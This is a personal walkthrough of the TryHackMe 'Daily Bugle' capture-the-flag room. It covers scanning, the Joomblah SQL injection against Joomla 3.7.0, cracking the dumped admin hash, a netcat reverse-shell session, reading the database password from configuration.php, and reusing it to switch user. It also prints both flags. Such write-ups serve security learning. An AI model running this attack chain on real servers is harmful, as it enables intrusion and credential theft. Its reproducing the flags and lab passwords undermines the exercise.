<h1>Hard - Daily Bugle</h1>

Day 219

![image](https://github.com/user-attachments/assets/c89a86f9-3bf3-45cc-b1ae-fea227eb52e0)


![image](https://github.com/user-attachments/assets/3bf3c4a6-67a1-49ea-b098-bcfb371bab11)



<br>

<pre><code>root@[THM AttackBox]:~/DailyBugle# nmap -sV [Target]
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-09 01:29 GMT
Nmap scan report for ip-[Target].eu-west-1.compute.internal ([Target])
Host is up (0.00032s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)
MAC Address: 02:24:5A:22:50:D5 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.24 seconds
root@ip-10-10-38-201:~/DailyBugle# 
</code></pre>

<br>

![image](https://github.com/user-attachments/assets/4bf5f9a9-9a21-40f4-93ef-6bc0eadfc221)

<br>

![image](https://github.com/user-attachments/assets/2083f2d2-7b76-4e90-adf2-4ae5a2f439dc)


<p><code>SpiderMan</code></p>

<br>

<pre><code>root@[THM AttackBox]:~/DailyBugle# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://[Target]
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://[Target]
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 235] [--> http://10.10.41.192/images/]
/templates            (Status: 301) [Size: 238] [--> http://10.10.41.192/templates/]
/media                (Status: 301) [Size: 234] [--> http://10.10.41.192/media/]
/modules              (Status: 301) [Size: 236] [--> http://10.10.41.192/modules/]
/bin                  (Status: 301) [Size: 232] [--> http://10.10.41.192/bin/]
/plugins              (Status: 301) [Size: 236] [--> http://10.10.41.192/plugins/]
/includes             (Status: 301) [Size: 237] [--> http://10.10.41.192/includes/]
/language             (Status: 301) [Size: 237] [--> http://10.10.41.192/language/]
/components           (Status: 301) [Size: 239] [--> http://10.10.41.192/components/]
/cache                (Status: 301) [Size: 234] [--> http://10.10.41.192/cache/]
/libraries            (Status: 301) [Size: 238] [--> http://10.10.41.192/libraries/]
/tmp                  (Status: 301) [Size: 232] [--> http://10.10.41.192/tmp/]
/layouts              (Status: 301) [Size: 236] [--> http://10.10.41.192/layouts/]
/administrator        (Status: 301) [Size: 242] [--> http://10.10.41.192/administrator/]
/cli                  (Status: 301) [Size: 232] [--> http://10.10.41.192/cli/]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================
root@[THM AttackBox]:~/DailyBugle# 
</code></pre>


<br>

![image](https://github.com/user-attachments/assets/2645fb28-89d8-42e8-9016-ba3ec8dd5917)

<br>

![image](https://github.com/user-attachments/assets/49fbb6fe-3ce0-459f-8e6b-5752e9eaf43a)


<br>



<pre><code>root@[THM AttackBox]:~/DailyBugle/ 
git clone https://github.com/rezasp/joomscan.git
root@[THM AttackBox]:~/DailyBugle/joomscan# perl joomscan.pl -u http://[Target]
...
[++] Joomla 3.7.0

...
...

[++] Admin page : http://[Target]/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://[Target]/robots.txt 

...
</code></pre>

<br>

<p>I learned aftwerwards that we can go to <code>http://[Target]/administrator/manifests/files/joomla.xml</code> we can find out Joomla´s version.</p>

<br>

![image](https://github.com/user-attachments/assets/a7b6dcdc-c19a-4df7-a60c-eb80b34ac9df)

<br>

![image](https://github.com/user-attachments/assets/ee470c35-026f-4256-9592-af1ef1646074)



<br>

<pre><code>https://github.com/XiphosResearch/exploits/tree/master/Joomblah
https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py
...

</code></pre>

![image](https://github.com/user-attachments/assets/2177abc8-80d6-447f-b24a-a9ea45129a2e)

<br>

![image](https://github.com/user-attachments/assets/08250356-8f16-4a11-8673-ec795f0c7071)

<br>

![image](https://github.com/user-attachments/assets/4b598160-0961-4e53-a8c8-e244c07fd52b)

<br>

<pre><code>Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']</code></pre>

<br>

<pre><code>https://hashcat.net/wiki/doku.php?id=example_hashes</code></pre>

<br>

![image](https://github.com/user-attachments/assets/5169dc4d-ee4c-4265-8445-3816871e1cb9)


<br>

<pre><code>root@[THM AttackBox]:~/DailyBugle# john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
</code></pre>

<br>

![image](https://github.com/user-attachments/assets/ba854302-fc68-4389-b688-4d7d426af7f0)

<br>



<p>Jonah’s password is <code>spiderman123</code>.</p>

![image](https://github.com/user-attachments/assets/66cedcbc-fa8c-4349-8175-bed6f3dd0e78)


<br>

![image](https://github.com/user-attachments/assets/4c5dd6ab-d8d3-412d-8bf9-4bfef0494c4e)


<br>

![image](https://github.com/user-attachments/assets/42e05f15-b91c-41b2-8d62-7a7dc53125a8)


<br>

![image](https://github.com/user-attachments/assets/666711c6-ea0d-4a3d-b3f2-163f7b5721a5)

<br>



![image](https://github.com/user-attachments/assets/20869614-42a2-41ca-82b9-a522ca6ef4fb)


<br>

![image](https://github.com/user-attachments/assets/56cd7a47-d36b-41e0-a1d6-1eb13a91e891)

<br>

![image](https://github.com/user-attachments/assets/7c9691df-3e32-4c35-a405-1dc66f940b98)

<br>

![image](https://github.com/user-attachments/assets/40fc3316-2c4c-4077-b051-39b44a92e6ee)

<br>


![image](https://github.com/user-attachments/assets/39013650-c2d7-4ecc-b1a2-2d68bcc3d5e7)

<br>

![image](https://github.com/user-attachments/assets/ea86e19c-e703-46b7-b4d1-d3a5ef70708d)

<br>

![image](https://github.com/user-attachments/assets/df222ecf-c4cb-4b08-94f5-daaf4fc83ec2)

<br>

![image](https://github.com/user-attachments/assets/78b7b71c-29fc-4397-99e4-470f58b0296c)

<br>

<pre><code>root@ip-10-10-38-201:~/DailyBugle# nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.41.192 46164
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 22:48:12 up  2:20,  0 users,  load average: 0.00, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ ls
ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
sh-4.2$ cd /var
cd /var
sh-4.2$ cd www
cd www
sh-4.2$ cd html
cd html
sh-4.2$ ls
ls
LICENSE.txt
README.txt
administrator
bin
cache
cli
components
configuration.php
htaccess.txt
images
includes
index.php
language
layouts
libraries
media
modules
plugins
robots.txt
templates
tmp
web.config.txt
sh-4.2$ cat configuration.php
cat configuration.php
<?php
class JConfig {
	public $offline = '0';
	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
	public $display_offline_message = '1';
	public $offline_image = '';
	public $sitename = 'The Daily Bugle';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = '20';
	public $access = '1';
	public $debug = '0';
	public $debug_lang = '0';
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'root';
	public $password = 'nv5uz9r3ZEDzVjNu';
	public $db = 'joomla';
	public $dbprefix = 'fb9j5_';
	public $live_site = '';
	public $secret = 'UAMBRWzHO3oFPmVC';
	public $gzip = '0';
	public $error_reporting = 'default';
	public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
	public $ftp_host = '127.0.0.1';
	public $ftp_port = '21';
	public $ftp_user = '';
	public $ftp_pass = '';
	public $ftp_root = '';
	public $ftp_enable = '0';
	public $offset = 'UTC';
	public $mailonline = '1';
	public $mailer = 'mail';
	public $mailfrom = 'jonah@tryhackme.com';
	public $fromname = 'The Daily Bugle';
	public $sendmail = '/usr/sbin/sendmail';
	public $smtpauth = '0';
	public $smtpuser = '';
	public $smtppass = '';
	public $smtphost = 'localhost';
	public $smtpsecure = 'none';
	public $smtpport = '25';
	public $caching = '0';
	public $cache_handler = 'file';
	public $cachetime = '15';
	public $cache_platformprefix = '0';
	public $MetaDesc = 'New York City tabloid newspaper';
	public $MetaKeys = '';
	public $MetaTitle = '1';
	public $MetaAuthor = '1';
	public $MetaVersion = '0';
	public $robots = '';
	public $sef = '1';
	public $sef_rewrite = '0';
	public $sef_suffix = '0';
	public $unicodeslugs = '0';
	public $feed_limit = '10';
	public $feed_email = 'none';
	public $log_path = '/var/www/html/administrator/logs';
	public $tmp_path = '/var/www/html/tmp';
	public $lifetime = '15';
	public $session_handler = 'database';
	public $shared_session = '0';
}sh-4.2$ 

</code></pre>

<br>

![image](https://github.com/user-attachments/assets/54f3164c-19e5-4ad7-8442-5e0c2d8ff638)

<pre><code>sh-4.2$ su jjameson 
su jjameson
Password: nv5uz9r3ZEDzVjNu
whoami 
jjameson
pwd
/home
ls
jjameson
ls -la
total 0
drwxr-xr-x.  3 root     root      22 Dec 14  2019 .
dr-xr-xr-x. 17 root     root     244 Dec 14  2019 ..
drwx------.  2 jjameson jjameson  99 Dec 15  2019 jjameson
ls -la jjameson
total 16
drwx------. 2 jjameson jjameson  99 Dec 15  2019 .
drwxr-xr-x. 3 root     root      22 Dec 14  2019 ..
lrwxrwxrwx  1 jjameson jjameson   9 Dec 14  2019 .bash_history -> /dev/null
-rw-r--r--. 1 jjameson jjameson  18 Aug  8  2019 .bash_logout
-rw-r--r--. 1 jjameson jjameson 193 Aug  8  2019 .bash_profile
-rw-r--r--. 1 jjameson jjameson 231 Aug  8  2019 .bashrc
-rw-rw-r--  1 jjameson jjameson  33 Dec 15  2019 user.txt
cd jjameson
ls
user.txt
cat user.txt
27a260fe3cba712cfdedb1c86d80442e

</code></pre>

<br>

![image](https://github.com/user-attachments/assets/3004f741-cc48-4adf-ad04-52af650f0a10)



<br>

![image](https://github.com/user-attachments/assets/ba854302-fc68-4389-b688-4d7d426af7f0)




<br>

![image](https://github.com/user-attachments/assets/e684a93a-5e2f-4b3d-b0c4-6384e3027f25)

<br>

<p>code>jjameson</code> can run <code>yum</code> for <code>ALL</code></p>

<br>

![image](https://github.com/user-attachments/assets/af8ba7ca-5799-492b-96cb-eeb2a8a23fa6)

<br>

![image](https://github.com/user-attachments/assets/9ca45715-468d-4076-a265-f5c9f293fda6)

<br>

![image](https://github.com/user-attachments/assets/a1391d9b-d59e-40b8-9544-4088b6e78a38)

<br>

![image](https://github.com/user-attachments/assets/46565fc7-1bf9-4d26-899e-19fe21ea7a0f)

<br>

![image](https://github.com/user-attachments/assets/9fee7638-01fd-469a-9363-3f7e014d99dc)

<br>

![image](https://github.com/user-attachments/assets/8aa047c8-8fd9-4bb4-bd34-0d021231cc23)

<code>eec3d53292b1821868266858d7fa6f79</code>


<br>

<h2>Task 3. Credits</h2>
<br>


Found another way to compromise the machine or want to assist others in rooting it? Keep an eye on the forum post located here.

![image](https://github.com/user-attachments/assets/92241c17-e662-4f00-84cf-a2690b71bb57)


<br>
<h2>Room Complete<a id='4'></a></h2>
<p>Keep learning, keep growing!</p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/a06c4b1c-ada7-4d3c-a0d3-c471afcb1ce9"></p>

<br>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/6b7d1484-ce36-4316-a9c0-eeabe64f8061"></p>

<br>

<h2>My Journey<a id='5'></a></h2>
<p>Following I share the status of my journey in TryHackMe.</p>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     |
| :---------------: | :------- | :----------- | :----------- | :---------- | :--------- | :------  | :-------- |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |
| December 11, 2024 | 219      |       950 th |        19 th |      653 rd |       8 th |  61,084  |       467 |

</div>


<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/5adef702-9b14-4141-a04c-8b6acc7ceaf1"></p>

<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>
